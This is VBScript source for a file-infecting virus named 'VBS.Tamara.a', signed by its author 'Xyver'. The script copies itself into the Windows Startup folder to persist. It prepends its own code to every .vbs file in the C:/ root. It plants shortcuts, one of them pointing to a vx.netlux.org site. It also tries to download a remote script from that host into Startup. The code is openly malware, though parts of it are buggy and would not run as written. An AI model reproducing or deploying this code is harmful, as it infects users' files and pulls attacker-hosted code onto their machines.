'------------------------------------------------
'VBS.Tamara.a Virus. Created by Xyver in Notepad
'Written for Tamara
'------------------------------------------------
Const Virtname = "VBS.Tamara.a"
Const XYV = 3000
Dim CRT, Virname, File, X
Dim Tamara, TaCode, TaFull
Dim TCode, TFile
Dim TaLink, TaShell
Set CRT = CreateObject("Scripting.FileSystemObject")
Set TaShell = Wscript.CreateObject("Wscript.shell")
Virname = wscript.Scriptfullname
Set Tamara = CRT.OpenTextFile(Virname, 1)
TaCode = Tamara.Read(XYV)
MsgBox "VIRUS!", vbOKOnly, Virtname
CRT.CopyFile Virname, "C:/WINDOWS/Desktop/tamara.vbs"
CRT.CopyFile Virname, "C:/WINDOWS/Start Menu/Programs/Startup/tamara.vbs"
Set TaLink = TaShell.CreateShortcut("C:\WINDOWS\Favorites\Xyvers Site.URL")
TaLink.TargetPath = "http://vx.netlux.org/~xyver"
TaLink.Save
Set TaLink = TaShell.CreateShortcut("C:\WINDOWS\Desktop\Tamarax.URL")
TaLink.TargetPath = "C:\WINDOWS\TEMP\tamarax.vbs"
TaLink.Save
Routine "C:/"
DLUpdate
Sub Routine(TFolder)
For Each X in CRT.GetFolder(TFolder).Files
If CRT.GetExtensionName(X.Name) = "vbs" then
MsgBox X
Set TFile = CRT.OpenTextFile(X.path,1)
TCode = TFile.ReadAll
TFile.Close
TCode = TaCode & TCode
Set TFile = CRT.OpenTextFile(X.Path,2,True)
TFile.Write TCode
TFile.Close
MsgBox X
MsgBox TCode
End If
next
End Sub
Sub DLUpdate()
On error resume next
Dim DLedCode, obInet
Set obInet = CreateObject("InetCtls.Inet")
obInet.RequestTimeOut = 25
strDownloadedCode = obInet.OpenURL("http://vx.netlux.org/~xyver/tamara/tamara.vbs")
Set WriteText = FSO.OpenTextFile("C:/WINDOWS/Start Menu/Startup/tamara.vbs", True)
WriteText.WriteLine DLedCode
WriteText.Close
MsgBox DLedCode
End Sub